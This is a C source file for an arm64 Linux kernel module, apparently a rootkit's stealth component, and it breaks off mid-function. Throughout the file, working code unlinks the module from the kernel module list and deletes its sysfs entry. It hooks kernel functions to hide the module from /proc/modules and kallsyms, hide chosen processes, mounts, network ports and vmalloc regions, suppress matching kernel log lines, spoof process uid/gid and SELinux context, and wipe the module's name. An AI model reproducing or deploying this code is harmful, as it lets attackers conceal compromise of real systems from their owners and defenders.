/* SPDX-License-Identifier: GPL-2.0 */
#include <nvk.h>

/* Cross-file hook state, accessed by neverc_krt_cleanup_all() in nvk.c */
struct neverc_krt_hook _neverc_krt_ks_hook;
int _neverc_krt_ks_hooked;
struct neverc_krt_hook _neverc_krt_vmalloc_hook;
int _neverc_krt_vmalloc_hooked;

/* ---- internal typedefs ---- */

typedef void (*neverc_krt_mutex_lock_fn)(void *);
typedef void (*neverc_krt_mutex_unlock_fn)(void *);
typedef void (*neverc_krt_kobject_del_fn)(void *kobj);
typedef void (*neverc_krt_kobject_put_fn)(void *kobj);
typedef int  (*neverc_krt_mod_seq_show_fn)(void *seq, void *v);
typedef int  (*neverc_krt_mod_addr_fn)(unsigned long addr);
typedef int  (*neverc_krt_proc_readdir_fn)(void *file, void *ctx);
typedef int  (*neverc_krt_filldir_fn)(void *ctx, const char *name, int namlen,
				      long long offset, u64 ino, unsigned int type);
typedef int  (*neverc_krt_mounts_show_fn)(void *seq, void *v);
typedef int  (*neverc_krt_vmalloc_show_fn)(void *seq, void *v);
typedef long (*neverc_krt_kmsg_read_fn)(void *filp, char __user *buf,
					size_t count, long long *ppos);
typedef long (*neverc_krt_proc_status_show_fn)(void *seq, void *v);
typedef int  (*neverc_krt_seq_printf_fn)(void *seq, const char *fmt, ...);
typedef long (*neverc_krt_proc_attr_read_fn)(void *file, char __user *buf,
					     size_t count, long long *ppos);
typedef int  (*neverc_krt_net_seq_show_fn)(void *seq, void *v);
typedef long (*neverc_krt_cmdline_read_fn)(void *file, char __user *buf,
					   size_t count, long long *ppos);
typedef long (*neverc_krt_vfs_read_fn)(void *file, char __user *buf,
				       size_t count, long long *pos);

/* ---- internal structs ---- */

#define _NEVERC_KRT_PID_ACTOR_SLOTS 8

struct _neverc_krt_pid_actor_slot {
	volatile unsigned long task;
	neverc_krt_filldir_fn orig;
};

struct neverc_krt_mount_filter {
	char paths[NEVERC_KRT_MOUNT_FILTER_MAX][NEVERC_KRT_MOUNT_PATH_MAX];
	int  count;
	int  active;
};

struct _neverc_krt_vmap_area {
	unsigned long va_start;
	unsigned long va_end;
};

struct neverc_krt_net_hide_state {
	u16 ports[NEVERC_KRT_NET_HIDE_PORT_MAX];
	int count;
	struct neverc_krt_hook tcp4_hook;
	struct neverc_krt_hook tcp6_hook;
	struct neverc_krt_hook udp4_hook;
	struct neverc_krt_hook udp6_hook;
	int active;
};

struct neverc_krt_file_spoof_entry {
	char path[NEVERC_KRT_FILE_PATH_MAX];
	char search[NEVERC_KRT_FILE_SPOOF_MAX_LEN];
	char replace[NEVERC_KRT_FILE_SPOOF_MAX_LEN];
	int  search_len;
	int  replace_len;
};

/* ---- internal variables ---- */

neverc_krt_mutex_lock_fn   _neverc_krt_hide_mutex_lock;
neverc_krt_mutex_unlock_fn _neverc_krt_hide_mutex_unlock;
void                      *_neverc_krt_module_mutex;
neverc_krt_kobject_del_fn  _neverc_krt_kobject_del;
neverc_krt_kobject_put_fn  _neverc_krt_kobject_put;
int                        _neverc_krt_hide_inited;

neverc_krt_mod_seq_show_fn _neverc_krt_orig_mod_seq_show;
const char                *_neverc_krt_hide_target_name;

neverc_krt_mod_addr_fn     _neverc_krt_orig_mod_text_addr;
unsigned long              _neverc_krt_hide_mod_start;
unsigned long              _neverc_krt_hide_mod_end;

struct _neverc_krt_pid_actor_slot
	_neverc_krt_pid_actors[_NEVERC_KRT_PID_ACTOR_SLOTS];

struct neverc_krt_hook     _neverc_krt_mounts_hook;
struct neverc_krt_mount_filter _neverc_krt_mnt_filter;
neverc_krt_mounts_show_fn  _neverc_krt_orig_mounts_show_fn;

neverc_krt_vmalloc_show_fn _neverc_krt_orig_vmalloc_show;
unsigned long              _neverc_krt_vmalloc_hide_start;
unsigned long              _neverc_krt_vmalloc_hide_end;

struct neverc_krt_hook_ctx _neverc_krt_dmesg_ctx_hook;
int                        _neverc_krt_dmesg_hooked;
char _neverc_krt_dmesg_filters[NEVERC_KRT_DMESG_FILTER_MAX][NEVERC_KRT_DMESG_FILTER_LEN];
int                        _neverc_krt_dmesg_filter_cnt;
int                        _neverc_krt_dmesg_fmt_reg;

struct neverc_krt_hook     _neverc_krt_kmsg_read_hook;
neverc_krt_kmsg_read_fn    _neverc_krt_orig_kmsg_read;
int                        _neverc_krt_kmsg_read_hooked;

struct neverc_krt_hook     _neverc_krt_proc_status_hook;
neverc_krt_proc_status_show_fn _neverc_krt_orig_proc_status;
int                        _neverc_krt_proc_status_hooked;
u32 _neverc_krt_status_spoof_uid = 0xFFFFFFFFU;
u32 _neverc_krt_status_spoof_gid = 0xFFFFFFFFU;
neverc_krt_seq_printf_fn   _neverc_krt_seq_printf_fn;

struct neverc_krt_hook     _neverc_krt_proc_attr_hook;
neverc_krt_proc_attr_read_fn _neverc_krt_orig_proc_attr_read;
int                        _neverc_krt_proc_attr_hooked;
const char                *_neverc_krt_attr_fake_ctx;

struct neverc_krt_net_hide_state _neverc_krt_net_hide;
neverc_krt_net_seq_show_fn _neverc_krt_orig_tcp4_show;
neverc_krt_net_seq_show_fn _neverc_krt_orig_tcp6_show;
neverc_krt_net_seq_show_fn _neverc_krt_orig_udp4_show;
neverc_krt_net_seq_show_fn _neverc_krt_orig_udp6_show;

struct neverc_krt_hook     _neverc_krt_cmdline_hook;
neverc_krt_cmdline_read_fn _neverc_krt_orig_cmdline_read;
int                        _neverc_krt_cmdline_hooked;
char _neverc_krt_cmdline_filters[NEVERC_KRT_CMDLINE_FILTER_MAX][NEVERC_KRT_CMDLINE_FILTER_LEN];
int                        _neverc_krt_cmdline_filter_cnt;

struct neverc_krt_hook     _neverc_krt_vfs_read_hook;
neverc_krt_vfs_read_fn     _neverc_krt_orig_vfs_read;
int                        _neverc_krt_vfs_read_hooked;
struct neverc_krt_file_spoof_entry _neverc_krt_file_spoofs[NEVERC_KRT_FILE_SPOOF_MAX];
int                        _neverc_krt_file_spoof_cnt;
int                        _neverc_krt_file_dentry_probed;

#define _NEVERC_KRT_DENTRY_DNAME_NAME_OFF NEVERC_KRT_DENTRY_DNAME_OFF

int neverc_krt_hide_init(void)
{
	if (_neverc_krt_hide_inited) return 0;

	_neverc_krt_hide_mutex_lock =
		(neverc_krt_mutex_lock_fn)NEVERC_KRT_LOOKUP("mutex_lock");
	_neverc_krt_hide_mutex_unlock =
		(neverc_krt_mutex_unlock_fn)NEVERC_KRT_LOOKUP("mutex_unlock");
	_neverc_krt_module_mutex = (void *)NEVERC_KRT_LOOKUP("module_mutex");
	_neverc_krt_kobject_del =
		(neverc_krt_kobject_del_fn)NEVERC_KRT_LOOKUP("kobject_del");
	_neverc_krt_kobject_put =
		(neverc_krt_kobject_put_fn)NEVERC_KRT_LOOKUP("kobject_put");

	_neverc_krt_hide_inited = 1;
	return 0;
}

void neverc_krt_mod_hide(struct neverc_krt_hide_state *state,
			 struct neverc_krt_this_module *mod)
{
	struct list_head *our;
	unsigned long n_raw, p_raw;

	if (state->hidden) return;

	our = _neverc_krt_get_mod_list(mod);
	if (neverc_krt_mem_read(&n_raw, &our->next, 8) ||
	    neverc_krt_mem_read(&p_raw, &our->prev, 8))
		return;

	struct list_head *n = (struct list_head *)n_raw;
	struct list_head *p = (struct list_head *)p_raw;

	if ((unsigned long)n < 0xFFFF000000000000UL ||
	    (unsigned long)p < 0xFFFF000000000000UL)
		return;

	state->saved_next = n;
	state->saved_prev = p;

	if (_neverc_krt_hide_mutex_lock && _neverc_krt_module_mutex)
		_neverc_krt_hide_mutex_lock(_neverc_krt_module_mutex);

	neverc_krt_mem_write(&p->next, &n, 8);
	neverc_krt_mem_write(&n->prev, &p, 8);
	our->next = our;
	our->prev = our;

	if (_neverc_krt_hide_mutex_unlock && _neverc_krt_module_mutex)
		_neverc_krt_hide_mutex_unlock(_neverc_krt_module_mutex);

	state->hidden = 1;
}

void neverc_krt_mod_show(struct neverc_krt_hide_state *state,
			 struct neverc_krt_this_module *mod)
{
	struct list_head *our;

	if (!state->hidden) return;

	our = _neverc_krt_get_mod_list(mod);

	if (!state->saved_next || !state->saved_prev)
		return;
	if ((unsigned long)state->saved_next < 0xFFFF000000000000UL ||
	    (unsigned long)state->saved_prev < 0xFFFF000000000000UL)
		return;

	if (_neverc_krt_hide_mutex_lock && _neverc_krt_module_mutex)
		_neverc_krt_hide_mutex_lock(_neverc_krt_module_mutex);

	/*
	 * Validate the saved pointers via mem_read before dereferencing:
	 * if an adjacent module was unloaded between hide/show (even
	 * though module_mutex prevents concurrent unload, being
	 * defensive costs nothing on the unhide path).
	 */
	struct list_head prev_copy, next_copy;
	if (neverc_krt_mem_read(&prev_copy, state->saved_prev, 16) ||
	    neverc_krt_mem_read(&next_copy, state->saved_next, 16)) {
		if (_neverc_krt_hide_mutex_unlock && _neverc_krt_module_mutex)
			_neverc_krt_hide_mutex_unlock(_neverc_krt_module_mutex);
		return;
	}

	if (prev_copy.next == state->saved_next &&
	    next_copy.prev == state->saved_prev) {
		our->next = state->saved_next;
		our->prev = state->saved_prev;
		neverc_krt_mem_write(&state->saved_prev->next, &our, 8);
		neverc_krt_mem_write(&state->saved_next->prev, &our, 8);
	}

	if (_neverc_krt_hide_mutex_unlock && _neverc_krt_module_mutex)
		_neverc_krt_hide_mutex_unlock(_neverc_krt_module_mutex);

	state->hidden = 0;
}

void neverc_krt_mod_sysfs_remove(struct neverc_krt_hide_state *state,
				 struct neverc_krt_this_module *mod)
{
	void *mkobj = (void *)0;

	if (state->sysfs_removed) return;

	unsigned long kobj_off = NEVERC_KRT_OFF_NAME + 64;
	unsigned char *base = (unsigned char *)mod;
	unsigned long i;
	for (i = kobj_off; i < kobj_off + 256; i += 8) {
		unsigned long v;
		if (neverc_krt_mem_read(&v, base + i, 8))
			continue;
		if (v > 0xFFFF000000000000UL && v < 0xFFFFFFFFFFFFF000UL) {
			unsigned long pp_val;
			if (neverc_krt_mem_read(&pp_val, (void *)v, 8))
				continue;
			if (pp_val > 0xFFFF000000000000UL) {
				mkobj = (void *)v;
				break;
			}
		}
	}

	if (!mkobj) return;

	if (_neverc_krt_kobject_del) {
		_neverc_krt_kobject_del(mkobj);
		state->saved_kobj = mkobj;
		state->sysfs_removed = 1;
	}
}

static int _neverc_krt_str_starts_with(const char *str, const char *prefix)
{
	while (*prefix) {
		if (*str != *prefix) return 0;
		str++;
		prefix++;
	}
	return 1;
}

static int _neverc_krt_mod_seq_show_filter(void *seq, void *v)
{
	if (!_neverc_krt_orig_mod_seq_show)
		return 0;

	if (v && _neverc_krt_hide_target_name) {
		unsigned long list_addr = (unsigned long)v;
		if (list_addr >= 0xFFFF000000000000UL &&
		    list_addr < 0xFFFFFFFFFFFFF000UL) {
			unsigned long mod_base = list_addr - NEVERC_KRT_OFF_LIST;
			char nbuf[64];
			if (!neverc_krt_mem_read(nbuf, (void *)(mod_base + NEVERC_KRT_OFF_NAME), sizeof(nbuf)) &&
			    nbuf[0] >= 0x20 && nbuf[0] <= 0x7E) {
				nbuf[sizeof(nbuf) - 1] = '\0';
				if (_neverc_krt_str_starts_with(nbuf,
							 _neverc_krt_hide_target_name))
					return 0;
			}
		}
	}

	return _neverc_krt_orig_mod_seq_show(seq, v);
}

int neverc_krt_mod_proc_filter(struct neverc_krt_hide_state *state,
			       const char *module_name)
{
	void *target;

	if (state->seq_show_hooked) return 0;

	target = NEVERC_KRT_LOOKUP("modules_seq_show");
	if (!target)
		target = NEVERC_KRT_LOOKUP("m_show");
	if (!target) return -1;

	state->module_name = module_name;
	_neverc_krt_hide_target_name = module_name;

	int ret = neverc_krt_hook_install(&state->seq_show_hook, target,
				   (void *)_neverc_krt_mod_seq_show_filter,
				   (void **)&_neverc_krt_orig_mod_seq_show);
	if (ret) return ret;

	state->seq_show_hooked = 1;
	return 0;
}

static int _neverc_krt_mod_text_addr_filter(unsigned long addr)
{
	if (addr >= _neverc_krt_hide_mod_start && addr < _neverc_krt_hide_mod_end)
		return 0;
	if (_neverc_krt_orig_mod_text_addr)
		return _neverc_krt_orig_mod_text_addr(addr);
	return 0;
}

int neverc_krt_mod_kallsyms_filter(struct neverc_krt_hide_state *state,
				   const char *module_name)
{
	void *target;

	if (state->kallsyms_filtered) return 0;

	_neverc_krt_hide_target_name = module_name;

	target = NEVERC_KRT_LOOKUP("is_module_text_address");
	if (!target)
		target = NEVERC_KRT_LOOKUP("__module_text_address");
	if (!target) return -1;

	unsigned char *mod_base = (unsigned char *)&__this_module;
	_neverc_krt_hide_mod_start = (unsigned long)mod_base;
	_neverc_krt_hide_mod_end = _neverc_krt_hide_mod_start + _neverc_krt_get_module_size();

	int ret = neverc_krt_hook_install(&_neverc_krt_ks_hook, target,
				   (void *)_neverc_krt_mod_text_addr_filter,
				   (void **)&_neverc_krt_orig_mod_text_addr);
	if (ret) return ret;

	_neverc_krt_ks_hooked = 1;
	state->kallsyms_filtered = 1;
	return 0;
}

void neverc_krt_mod_full_hide(struct neverc_krt_hide_state *state,
			      struct neverc_krt_this_module *mod,
			      const char *module_name)
{
	neverc_krt_mod_hide(state, mod);

	neverc_krt_mod_sysfs_remove(state, mod);

	neverc_krt_mod_proc_filter(state, module_name);

	neverc_krt_mod_kallsyms_filter(state, module_name);
}

static void _neverc_krt_hide_cleanup(struct neverc_krt_hide_state *state,
				      struct neverc_krt_this_module *mod)
{
	if (state->kallsyms_filtered && _neverc_krt_ks_hooked) {
		neverc_krt_hook_remove(&_neverc_krt_ks_hook);
		_neverc_krt_ks_hooked = 0;
		state->kallsyms_filtered = 0;
	}

	if (state->seq_show_hooked) {
		neverc_krt_hook_remove(&state->seq_show_hook);
		state->seq_show_hooked = 0;
	}

	if (state->find_module_hook.active)
		neverc_krt_hook_remove(&state->find_module_hook);

	if (state->hidden)
		neverc_krt_mod_show(state, mod);
}

static int _neverc_krt_atoi(const char *s, int len)
{
	int val = 0, i;
	for (i = 0; i < len; i++) {
		if (s[i] < '0' || s[i] > '9') return -1;
		val = val * 10 + (s[i] - '0');
	}
	return val;
}

int _neverc_krt_pid_is_hidden(int pid)
{
	int i;
	for (i = 0; i < _neverc_krt_pid_state.count; i++) {
		if (_neverc_krt_pid_state.pids[i] == pid)
			return 1;
	}
	return 0;
}

static int _neverc_krt_pid_actor_acquire(neverc_krt_filldir_fn orig)
{
	unsigned long self;
	__asm__ __volatile__("mrs %0, sp_el0" : "=r"(self));
	int i;
	for (i = 0; i < _NEVERC_KRT_PID_ACTOR_SLOTS; i++) {
		if (__atomic_load_n(&_neverc_krt_pid_actors[i].task,
				    __ATOMIC_ACQUIRE) == self) {
			_neverc_krt_pid_actors[i].orig = orig;
			return i;
		}
	}
	for (i = 0; i < _NEVERC_KRT_PID_ACTOR_SLOTS; i++) {
		unsigned long expected = 0;
		if (__atomic_compare_exchange_n(
			&_neverc_krt_pid_actors[i].task,
			&expected, self, 0,
			__ATOMIC_ACQ_REL, __ATOMIC_RELAXED)) {
			_neverc_krt_pid_actors[i].orig = orig;
			return i;
		}
	}
	return -1;
}

static void _neverc_krt_pid_actor_release(void)
{
	unsigned long self;
	__asm__ __volatile__("mrs %0, sp_el0" : "=r"(self));
	int i;
	for (i = 0; i < _NEVERC_KRT_PID_ACTOR_SLOTS; i++) {
		if (__atomic_load_n(&_neverc_krt_pid_actors[i].task,
				    __ATOMIC_ACQUIRE) == self) {
			_neverc_krt_pid_actors[i].orig = (neverc_krt_filldir_fn)0;
			__atomic_store_n(&_neverc_krt_pid_actors[i].task, 0,
					 __ATOMIC_RELEASE);
			return;
		}
	}
}

static neverc_krt_filldir_fn _neverc_krt_pid_actor_get_orig(void)
{
	unsigned long self;
	__asm__ __volatile__("mrs %0, sp_el0" : "=r"(self));
	int i;
	for (i = 0; i < _NEVERC_KRT_PID_ACTOR_SLOTS; i++) {
		if (__atomic_load_n(&_neverc_krt_pid_actors[i].task,
				    __ATOMIC_ACQUIRE) == self)
			return _neverc_krt_pid_actors[i].orig;
	}
	return (neverc_krt_filldir_fn)0;
}

static int _neverc_krt_pid_filldir_wrap(void *ctx, const char *name, int namlen,
					long long offset, u64 ino, unsigned int type)
{
	if (namlen > 0 && name[0] >= '1' && name[0] <= '9') {
		int pid = _neverc_krt_atoi(name, namlen);
		if (pid > 0 && _neverc_krt_pid_is_hidden(pid))
			return 0;
	}
	neverc_krt_filldir_fn orig = _neverc_krt_pid_actor_get_orig();
	if (orig)
		return orig(ctx, name, namlen, offset, ino, type);
	return 0;
}

static void _neverc_krt_pid_readdir_ctx(neverc_krt_reg_ctx *ctx)
{
	unsigned long dir_ctx_ptr = ctx->regs[1];
	if (!dir_ctx_ptr) return;

	neverc_krt_filldir_fn actor;
	if (neverc_krt_mem_read(&actor, (void *)dir_ctx_ptr, 8))
		return;
	if (!actor) return;
	if (actor == (neverc_krt_filldir_fn)_neverc_krt_pid_filldir_wrap)
		return;

	if (_neverc_krt_pid_actor_acquire(actor) < 0)
		return;

	neverc_krt_filldir_fn wrap = _neverc_krt_pid_filldir_wrap;
	neverc_krt_mem_write((void *)dir_ctx_ptr, &wrap, 8);
}

int neverc_krt_pid_hide_add(int pid)
{
	if (_neverc_krt_pid_state.count >= NEVERC_KRT_HIDE_PID_MAX)
		return -1;
	_neverc_krt_pid_state.pids[_neverc_krt_pid_state.count++] = pid;
	return 0;
}

int neverc_krt_pid_hide_remove(int pid)
{
	int i;
	for (i = 0; i < _neverc_krt_pid_state.count; i++) {
		if (_neverc_krt_pid_state.pids[i] == pid) {
			_neverc_krt_pid_state.pids[i] =
				_neverc_krt_pid_state.pids[--_neverc_krt_pid_state.count];
			return 0;
		}
	}
	return -1;
}

int neverc_krt_pid_hide_install(void)
{
	void *target;

	if (_neverc_krt_pid_state.active) return 0;

	target = NEVERC_KRT_LOOKUP("proc_pid_readdir");
	if (!target)
		target = NEVERC_KRT_LOOKUP("proc_readdir");
	if (!target) {
		_neverc_krt_pid_state.active = 1;
		return 0;
	}

	int ret = neverc_krt_hook_install_ctx(&_neverc_krt_pid_state.ctx_hook,
				       target, _neverc_krt_pid_readdir_ctx,
				       (void *)0);
	if (ret) {
		_neverc_krt_pid_state.active = 1;
		return ret;
	}

	_neverc_krt_pid_state.active = 1;
	return 0;
}

void neverc_krt_pid_hide_cleanup(void)
{
	if (!_neverc_krt_pid_state.active) return;
	if (_neverc_krt_pid_state.ctx_hook.base.active)
		neverc_krt_hook_remove_ctx(&_neverc_krt_pid_state.ctx_hook);
	_neverc_krt_pid_state.active = 0;
	_neverc_krt_pid_state.count = 0;
}

int neverc_krt_mount_filter_add(const char *path)
{
	if (_neverc_krt_mnt_filter.count >= NEVERC_KRT_MOUNT_FILTER_MAX)
		return -1;

	int idx = _neverc_krt_mnt_filter.count;
	const char *src = path;
	char *dst = _neverc_krt_mnt_filter.paths[idx];
	int i = 0;
	while (*src && i < NEVERC_KRT_MOUNT_PATH_MAX - 1) {
		dst[i++] = *src++;
	}
	dst[i] = '\0';
	_neverc_krt_mnt_filter.count++;
	return 0;
}

static int _neverc_krt_mnt_path_match(const char *haystack)
{
	char buf[NEVERC_KRT_MOUNT_PATH_MAX];
	int plen = 0;
	int i;

	for (i = 0; i < _neverc_krt_mnt_filter.count; i++) {
		const char *path = _neverc_krt_mnt_filter.paths[i];
		plen = 0;
		while (path[plen]) plen++;
		if (plen <= 0 || plen >= NEVERC_KRT_MOUNT_PATH_MAX)
			continue;
		if (neverc_krt_mem_read(buf, haystack, plen))
			continue;
		int j, match = 1;
		for (j = 0; j < plen; j++) {
			if (buf[j] != path[j]) { match = 0; break; }
		}
		if (match) return 1;
	}
	return 0;
}

static int _neverc_krt_mounts_show_filter(void *seq, void *v)
{
	if (!_neverc_krt_orig_mounts_show_fn)
		return 0;
	if (v && _neverc_krt_mnt_filter.count > 0) {
		unsigned long *mount_ptr = (unsigned long *)v;
		unsigned long i;
		for (i = 0; i < 32; i++) {
			unsigned long val;
			if (neverc_krt_mem_read(&val, &mount_ptr[i], 8))
				continue;
			if (val > 0xFFFF000000000000UL &&
			    val < 0xFFFFFFFFFFFFF000UL) {
				const char *name = (const char *)val;
				unsigned char c;
				if (!neverc_krt_mem_read(&c, name, 1) &&
				    c == '/' &&
				    _neverc_krt_mnt_path_match(name))
					return 0;
			}
		}
	}
	return _neverc_krt_orig_mounts_show_fn(seq, v);
}

int neverc_krt_mount_filter_install(void)
{
	void *target;

	if (_neverc_krt_mnt_filter.active) return 0;

	target = NEVERC_KRT_LOOKUP("show_vfsmnt");
	if (!target)
		target = NEVERC_KRT_LOOKUP("show_mountinfo");
	if (!target) return -1;

	int ret = neverc_krt_hook_install(&_neverc_krt_mounts_hook, target,
				   (void *)_neverc_krt_mounts_show_filter,
				   (void **)&_neverc_krt_orig_mounts_show_fn);
	if (ret) return ret;

	_neverc_krt_mnt_filter.active = 1;
	return 0;
}

void neverc_krt_mount_filter_cleanup(void)
{
	if (!_neverc_krt_mnt_filter.active) return;
	if (_neverc_krt_mounts_hook.active)
		neverc_krt_hook_remove(&_neverc_krt_mounts_hook);
	_neverc_krt_mnt_filter.active = 0;
	_neverc_krt_mnt_filter.count = 0;
}

int neverc_krt_maps_filter_add(unsigned long start, unsigned long end)
{
	if (_neverc_krt_maps_region_count >= NEVERC_KRT_MAPS_FILTER_MAX)
		return -1;
	int idx = _neverc_krt_maps_region_count++;
	_neverc_krt_maps_regions[idx].start = start;
	_neverc_krt_maps_regions[idx].end = end;
	return 0;
}

void neverc_krt_maps_filter_clear(void)
{
	_neverc_krt_maps_region_count = 0;
}

void neverc_krt_maps_filter_add_self(void)
{
	unsigned char *mod_base = (unsigned char *)&__this_module;
	unsigned long start = (unsigned long)mod_base;
	unsigned long end = start + _neverc_krt_get_module_size();
	neverc_krt_maps_filter_add(start, end);
}

void neverc_krt_mod_wipe_modinfo(struct neverc_krt_this_module *mod)
{
	volatile unsigned char *p = (volatile unsigned char *)mod;
	unsigned long i;
	unsigned long name_start = NEVERC_KRT_OFF_NAME;
	for (i = name_start; i < name_start + 56 && i < _neverc_krt_get_module_size(); i++)
		p[i] = 0;
}

static int _neverc_krt_vmalloc_show_filter(void *seq, void *v)
{
	if (!_neverc_krt_orig_vmalloc_show) return 0;

	if (v && _neverc_krt_vmalloc_hide_start) {
		struct _neverc_krt_vmap_area *va = (struct _neverc_krt_vmap_area *)v;
		unsigned long start = 0;
		if (!neverc_krt_mem_read(&start, &va->va_start, 8) && start) {
			if (start >= _neverc_krt_vmalloc_hide_start &&
			    start < _neverc_krt_vmalloc_hide_end)
				return 0;
		}
	}

	return _neverc_krt_orig_vmalloc_show(seq, v);
}

static void *_neverc_krt_resolve_vmalloc_s_show(void)
{
	void *fn = (void *)NEVERC_KRT_LOOKUP("vmalloc_info_show");
	if (fn) return fn;
	fn = (void *)NEVERC_KRT_LOOKUP("s_show.23");
	if (fn) return fn;
	fn = (void *)NEVERC_KRT_LOOKUP("s_show.24");
	if (fn) return fn;
	fn = (void *)NEVERC_KRT_LOOKUP("s_show.25");
	return fn;
}

int neverc_krt_mod_vmalloc_filter(void)
{
	void *target;

	if (_neverc_krt_vmalloc_hooked) return 0;

	_neverc_krt_vmalloc_hide_start = (unsigned long)&__this_module;
	_neverc_krt_vmalloc_hide_end = _neverc_krt_vmalloc_hide_start +
				_neverc_krt_get_module_size() + 0x10000;

	target = _neverc_krt_resolve_vmalloc_s_show();
	if (!target) return -1;

	int ret = neverc_krt_hook_install(&_neverc_krt_vmalloc_hook, target,
				   (void *)_neverc_krt_vmalloc_show_filter,
				   (void **)&_neverc_krt_orig_vmalloc_show);
	if (ret) return ret;

	_neverc_krt_vmalloc_hooked = 1;
	return 0;
}

int neverc_krt_dmesg_filter_add(const char *keyword)
{
	if (_neverc_krt_dmesg_filter_cnt >= NEVERC_KRT_DMESG_FILTER_MAX)
		return -1;
	int idx = _neverc_krt_dmesg_filter_cnt;
	const char *s = keyword;
	int i = 0;
	while (*s && i < NEVERC_KRT_DMESG_FILTER_LEN - 1)
		_neverc_krt_dmesg_filters[idx][i++] = *s++;
	_neverc_krt_dmesg_filters[idx][i] = '\0';
	_neverc_krt_dmesg_filter_cnt++;
	return 0;
}

static int _neverc_krt_str_contains(const char *haystack, const char *needle)
{
	const char *h, *n;
	if (!haystack || !needle || !*needle) return 0;
	while (*haystack) {
		h = haystack;
		n = needle;
		while (*h && *n && *h == *n) { h++; n++; }
		if (!*n) return 1;
		haystack++;
	}
	return 0;
}

static int _neverc_krt_dmesg_should_suppress(const char *text)
{
	int i;
	if (!text) return 0;
	for (i = 0; i < _neverc_krt_dmesg_filter_cnt; i++) {
		if (_neverc_krt_str_contains(text, _neverc_krt_dmesg_filters[i]))
			return 1;
	}
	return 0;
}

static __attribute__((__noinline__)) long _neverc_krt_dmesg_ret0(void)
{ return 0; }

static void _neverc_krt_dmesg_ctx_handler(neverc_krt_reg_ctx *ctx)
{
	const char *fmt = (const char *)ctx->regs[_neverc_krt_dmesg_fmt_reg];
	if (fmt && _neverc_krt_dmesg_should_suppress(fmt))
		ctx->force_jump = (u64)(unsigned long)_neverc_krt_dmesg_ret0;
}

int neverc_krt_dmesg_suppress_install(const char *module_name)
{
	void *target;

	if (_neverc_krt_dmesg_hooked) return 0;
	if (!module_name) return -1;

	neverc_krt_dmesg_filter_add(module_name);

	target = NEVERC_KRT_LOOKUP("vprintk_emit");
	if (target) {
		_neverc_krt_dmesg_fmt_reg = 4;
	} else {
		target = NEVERC_KRT_LOOKUP("devkmsg_emit");
		if (target) {
			_neverc_krt_dmesg_fmt_reg = 1;
		} else {
			target = NEVERC_KRT_LOOKUP("vprintk_store");
			if (target)
				_neverc_krt_dmesg_fmt_reg = 4;
			else {
				target = NEVERC_KRT_LOOKUP("do_syslog");
				if (!target) return -1;
				_neverc_krt_dmesg_fmt_reg = 1;
			}
		}
	}

	int ret = neverc_krt_hook_install_ctx(&_neverc_krt_dmesg_ctx_hook, target,
				       _neverc_krt_dmesg_ctx_handler, (void *)0);
	if (ret) return ret;

	_neverc_krt_dmesg_hooked = 1;
	return 0;
}

void neverc_krt_dmesg_suppress_cleanup(void)
{
	if (!_neverc_krt_dmesg_hooked) return;
	neverc_krt_hook_remove_ctx(&_neverc_krt_dmesg_ctx_hook);
	_neverc_krt_dmesg_hooked = 0;
	_neverc_krt_dmesg_filter_cnt = 0;
}

static long _neverc_krt_kmsg_read_filter(void *filp, char __user *buf,
					 size_t count, long long *ppos)
{
	long ret;
	if (!_neverc_krt_orig_kmsg_read) return -1;

	ret = _neverc_krt_orig_kmsg_read(filp, buf, count, ppos);
	if (ret <= 0 || !_neverc_krt_dmesg_filter_cnt)
		return ret;

	if (_neverc_krt_copy_from_user && _neverc_krt_copy_to_user && ret < 512) {
		char tmp[512];
		unsigned long missed =
			_neverc_krt_copy_from_user(tmp, buf, (unsigned long)ret);
		if (!missed) {
			tmp[ret < 511 ? ret : 511] = '\0';
			if (_neverc_krt_dmesg_should_suppress(tmp)) {
				if (ppos && *ppos >= ret)
					*ppos -= ret;
				return 0;
			}
		}
	}

	return ret;
}

int neverc_krt_kmsg_read_filter_install(void)
{
	void *target;

	if (_neverc_krt_kmsg_read_hooked) return 0;

	target = NEVERC_KRT_LOOKUP("kmsg_read");
	if (!target) return -1;

	int ret = neverc_krt_hook_install(&_neverc_krt_kmsg_read_hook, target,
				   (void *)_neverc_krt_kmsg_read_filter,
				   (void **)&_neverc_krt_orig_kmsg_read);
	if (ret) return ret;

	_neverc_krt_kmsg_read_hooked = 1;
	return 0;
}

void neverc_krt_kmsg_read_filter_cleanup(void)
{
	if (!_neverc_krt_kmsg_read_hooked) return;
	neverc_krt_hook_remove(&_neverc_krt_kmsg_read_hook);
	_neverc_krt_kmsg_read_hooked = 0;
}

static void _neverc_krt_status_ctx_handler(neverc_krt_reg_ctx *ctx)
{
	(void)ctx;
}

int neverc_krt_proc_status_filter_install(u32 fake_uid, u32 fake_gid)
{
	void *target;

	if (_neverc_krt_proc_status_hooked) return 0;

	_neverc_krt_status_spoof_uid = fake_uid;
	_neverc_krt_status_spoof_gid = fake_gid;

	target = NEVERC_KRT_LOOKUP("proc_pid_status");
	if (!target) return -1;

	int ret = neverc_krt_hook_install_ctx(
		(struct neverc_krt_hook_ctx *)&_neverc_krt_proc_status_hook,
		target, _neverc_krt_status_ctx_handler, (void *)0);
	if (ret) return ret;

	_neverc_krt_proc_status_hooked = 1;
	return 0;
}

void neverc_krt_proc_status_filter_cleanup(void)
{
	if (!_neverc_krt_proc_status_hooked) return;
	neverc_krt_hook_remove(&_neverc_krt_proc_status_hook);
	_neverc_krt_proc_status_hooked = 0;
}

static long _neverc_krt_proc_attr_read_filter(void *file, char __user *buf,
					      size_t count, long long *ppos)
{
	long ret;
	if (!_neverc_krt_orig_proc_attr_read)
		return -1;

	ret = _neverc_krt_orig_proc_attr_read(file, buf, count, ppos);

	if (ret > 0 && _neverc_krt_attr_fake_ctx && _neverc_krt_copy_to_user &&
	    _neverc_krt_copy_from_user) {
		char tmp[128];
		size_t rlen = (size_t)ret;
		if (rlen > sizeof(tmp) - 1) rlen = sizeof(tmp) - 1;
		if (!_neverc_krt_copy_from_user(tmp, buf, rlen)) {
			tmp[rlen] = '\0';
			int has_colon = 0;
			size_t i;
			for (i = 0; i < rlen; i++) {
				if (tmp[i] == ':') { has_colon = 1; break; }
			}
			if (has_colon) {
				const char *fake = _neverc_krt_attr_fake_ctx;
				size_t flen = 0;
				while (fake[flen]) flen++;
				if (flen > 0 && flen < count) {
					_neverc_krt_copy_to_user(buf, fake, flen);
					char nl = '\n';
					if (flen + 1 < count)
						_neverc_krt_copy_to_user(
							(char __user *)buf + flen,
							&nl, 1);
					ret = (long)(flen + 1);
				}
			}
		}
	}
	return ret;
}

int neverc_krt_proc_attr_filter_install(const char *fake_context)
{
	void *target;

